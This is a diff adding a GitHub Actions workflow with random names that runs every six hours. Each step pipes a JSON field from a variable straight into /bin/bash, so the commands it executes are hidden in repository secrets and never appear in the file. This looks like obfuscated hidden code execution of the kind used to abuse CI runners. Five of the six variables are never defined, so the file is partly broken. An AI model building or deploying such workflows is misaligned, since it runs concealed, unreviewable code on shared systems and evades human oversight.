@@ -1,0 +1,23 @@
+name: taohuani4163
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taohuani4163
+        env:
+          iy1: ${{ secrets.iy1 }}
+        run: |
+          echo $iy1 | jq -r .ueoal51836 | /bin/bash
+          echo $u3 | jq -r .ezqb61978 | /bin/bash
+          echo $oyjph624 | jq -r .i53 | /bin/bash
+          echo $hff59 | jq -r .hqw1 | /bin/bash
+          echo $wcq0757 | jq -r .aw141 | /bin/bash
+          echo $i28 | jq -r .mfyd0 | /bin/bash
+
